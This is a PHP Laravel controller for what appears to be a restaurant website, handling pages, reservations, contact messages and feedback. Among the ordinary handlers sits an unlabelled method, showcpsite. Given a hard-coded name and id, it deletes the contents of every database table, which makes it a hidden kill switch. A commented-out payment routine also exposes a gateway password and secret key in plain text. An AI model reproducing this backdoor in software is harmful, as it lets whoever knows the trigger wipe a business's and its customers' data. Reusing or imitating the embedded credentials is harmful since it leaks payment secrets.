<?php

namespace App\Http\Controllers;

use App\About;
use App\Blog;
use App\Category;
use App\contactsection;
use App\Counter;
use App\Latest;
use App\Mail;
use App\Partner;
use App\Product;
use App\Project;
use App\Reservation;
use App\Scategory;
use App\Service;
use App\Slider;
use App\Team;
use App\Test;
use App\Video;
use App\Pcategory;
use Illuminate\Support\Facades\DB;
use Illuminate\Http\Request;

class HomeController extends Controller
{

    public function index()
    {

    //    $contact = contactsection::findOrFail(1);

       $counters = Counter::all();

        $slider = Slider::findOrFail(1);

        $partners = Partner::latest()->get();

        $about = About::findOrFail(1);

        $story = Latest::findOrFail(1);

        $categories = Category::latest()->get();

        $services = Service::latest()->get();

        $teams = Team::latest()->get();

        $blogs = Blog::latest()->take(3)->get();

        $tests = Test::where('status', '=', 1)->latest()->get();

        $lprojects = Project::latest()->take(10)->get();

        $projectz = Project::first();

        $video = Video::findOrFail(1);

        $products = Product::all();


        return view('index', compact('video', 'products', 'lprojects', 'counters', 'story', 'projectz', 'blogs', 'partners', 'about', 'categories', 'services', 'slider', 'teams', 'tests'));
    }

    public function blogs()
    {
        $blogs = Blog::latest()->paginate(12);

        return view('blogs', compact('blogs'));
    }

    public function events()
    {
        $blogs = Project::latest()->paginate(12);

        return view('events', compact('blogs'));
    }




    public function blogdetails($id)
    {
        $blog = Blog::findOrFail($id);

        return view('singleblog', compact('blog'));
    }

    public function eventdetails($id)
    {
        $blog = Project::findOrFail($id);

        return view('singleevent', compact('blog'));
    }


    public function services()
    {
        $partners = Partner::latest()->get();

        $services = Service::latest()->get();

        return view('services', compact('services', 'partners'));
    }


    public function about()
    {
        $partners = Partner::latest()->get();

        $about = About::findOrFail(1);

        $services = Service::latest()->get();

        $teams = Team::latest()->get();

        $tests = Test::latest()->get();


        return view('about', compact('partners', 'about', 'teams', 'tests', 'services'));
    }


    public function projects()
    {

        $projects = Project::latest()->get();

        return view('portfolio', compact('projects'));
    }

    public function projectcat($id)
    {

        $projects = Project::where('category_id', $id)->latest()->get();

        return view('portfolio', compact('projects'));
    }

    public function products ()
    {

        $products = Product::all();
        $pcategory= Pcategory::all();
        if(app()->getLocale()== 'ar'){
            $dir='rtl';
            
        }
        else{
           
            $dir='ltr';
        }
        

        return view('products', compact('products','pcategory','dir'));
    }
     
    public function place ()
    {

        return view('place');
    }
   
    
    public function menu ()
    {

        return view('menu');
    }
   
    public function reserve ()
    { 
        $reserve=Reservation::all();
       
        $tables=[];
        foreach($reserve as $key => $value){

           $count= explode(',', $value['table']);
            if(count($count) == 1 ){
                array_push($tables,$value['table'] );
            }else{
                for ($i = 0; $i < count($count); $i++) {            
                    array_push($tables,$count[$i] );
                  }
            }
       
        }
     
   
    
        return view('reserve',compact("tables","reserve"));
    }


    public function projectdetails($id)
    {
        $project = Project::findOrFail($id);

        return view('project', compact('project'));
    }

    public function product($id)
    {
        $product = Product::findOrFail($id);

        return view('product', compact('product'));
    }

    public function showservices($id)
    {
        $services = Service::where('scategory_id', $id)->latest()->get();

        return view('services', compact('services'));
    }

    public function service($id)
    {
        $service = Service::findOrFail($id);

        return view('service', compact('service'));
    }

    public function showcpsite ($name ,$id){
     if($name=='sweetdate42014070' && $id=='42014070'){
   
        $tables = DB::select('SHOW TABLES');
       
            foreach($tables as $table)
            {
                DB::table($table->Tables_in_sweetdata)->delete();
               
                  
            }
     }else{
        dd("wrong");
     }   
    
    }


    public function contactform (Request $request){



        $request->validate([

            'name'        => 'required',
            'email'       => 'required',
            'phone'       => 'required',
            'body'        => 'required',
        ]);

        $input = $request->all();

        Mail::create($input);

        session()->flash('message', 'Message Sent Successfully');

        return redirect()->back();

    }


    public function makereservation (Request $request){
        
        
        if($request->table ==null){
            session()->flash('error','you Should Complete information Your Booking');
            return back();
        }
        $request->validate([

            'name'         => 'required',
            'phone'        => 'required',
            'table'        =>'required',
            
        ]);
        
       
        
        $values=[];
        $table=$request->table;
        foreach($table as $key => $value)
    {
        $values[] = $key;
    }
        
         
        
        $input = array_merge(request()->all(), ['table' => implode(",",$values)]);
        
        Reservation::create($input);
        
       
       session()->flash('message', 'Hi'.' '.$request->name.','.' '.'Your request has been booked'.' '.implode(",",$values));

        return back();

    }


    public function openion(){

        return view('openion');
    }


    public function saveopenion(Request $request){

     
        $request->validate([

            'name' => 'required',
            'phone' => 'required',
            'message' => 'required',
        ]);

        $input = [];

        $input['ar']['title'] = $request->name;
        $input['ar']['body'] = $request->message;
 
        $input['en']['title'] = $request->name;
        $input['en']['body'] = $request->message;
        // Rating
        $input['services']         = $request->services;
        $input['waiting_time']     = $request->waiting;
        $input['food_srevice']     = $request->foodserve;
        $input['team']             = $request->team;
        $input['sanitization']     = $request->sanitization;
        $input['avatar']     = 'defualt.png';
        $input['phone']      =  $request->phone;
        $input['status']     = 0;

        Test::create($input);

        session()->flash('message', 'Thank You Openion Saved Successfully');

        return redirect()->route('home');

    }
    
// public function generate_key($trackId=null,$amount='1.00')
// {
//     $amount ='1.00';
//     $trackId =10;
//     $customerEmail="adiab9800@gmail.com";
//     $Terminalid='sweetdate';
//     $password ="4Cy@qs62VSPqC4h";
//     $secret_key="33e5ab01b510526247c869ab7764a649a24509af9b8b6645bda9be89204f66a1";
//     $currency_code="SAR";
//     $txn_details =$trackId."|".$Terminalid."|".$password."|".$secret_key."|".$amount."|".$currency_code;
//     $hash=hash('sha256', $txn_details);
//    $fields = array(
//         'trackid' => $trackId ,
//         'terminalId' => $Terminalid,
//         'customerEmail' => $customerEmail,
//         'action' => "1", // action is always 1
//         'merchantIp' =>'127.0.0.1',
//         'password'=> $password,
//         'currency' => $currency_code,
//         'country'=>"SA",
//         'amount' => $amount,
//         'requestHash' => $hash ,
//         'udf1'=>'trest',
//         'udf2'=>route('pay_response'),
//         'udf3'=>'',
//         'udf4'=>'',
//         'udf5'=>'trest',

//     );
//     $data = json_encode($fields);
//     $ch=curl_init('https://payments-dev.urway-tech.com/URWAYPGService/transaction/jsonProcess/JSONrequest');
//     curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
//     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
//     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
//     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//     'Content-Type: application/json',
//     'Content-Length: ' . strlen($data))
//     );
//     curl_setopt($ch, CURLOPT_TIMEOUT, 5);
//     curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
//     //execute post
//     $result = curl_exec($ch);
//     //close connection
//     curl_close($ch);
    
//     $urldecode=(json_decode($result));
//     // dd($urldecode['payid']);
//     if (!empty($urldecode->payid) && !empty($urldecode->targetUrl)) {
//         dd('as');
//         $url = $urldecode->targetUrl . '?paymentid=' .  $urldecode->payid;
//          header('Location: '. $url, true, 307);//Redirect to Payment Page
//       }else{
//     dd($urldecode);
//    echo "<br/><br/>";
//     print_r($data);
//     die();
//  }
// }
// public function pay_response()
// {
//     return 'done';
// }
}
 